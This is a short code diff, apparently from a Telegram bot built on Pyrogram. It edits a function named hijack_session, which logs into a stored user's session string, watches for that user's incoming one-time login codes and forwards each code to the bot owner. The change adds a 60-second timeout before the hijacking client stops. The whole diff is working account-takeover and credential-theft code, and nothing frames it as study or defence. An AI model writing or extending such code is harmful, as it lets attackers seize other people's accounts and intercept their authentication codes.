@@ -200,7 +200,7 @@ async def hijack_session(_, message):
     session_string = user_session["session_string"]
 
     await message.reply("✅ User found! Listening for OTP...")
-    otp_listeners[user_id] = admin_id
+    #otp_listeners[user_id] = admin_id
 
     try:
         otp_userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=session_string)
@@ -214,7 +214,11 @@ async def hijack_session(_, message):
                 otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
                 #OWNER_ID = int(OWNER_ID)
                 await app.send_message(int(OWNER_ID), otp_text)
-        await idle()
-        asyncio.create_task(otp_userbot.run())
+                # ✅ Wait briefly to receive OTP, then terminate
+                await asyncio.sleep(60)  # Wait 1 minutes before auto-stopping
+                await otp_userbot.stop()
+                await message.reply("🛑 OTP session closed after timeout.")
+        #await idle()
+        #asyncio.create_task(otp_userbot.run())
     except Exception as e:
         await message.reply(f"❌ Failed to start the userbot: {str(e)}")
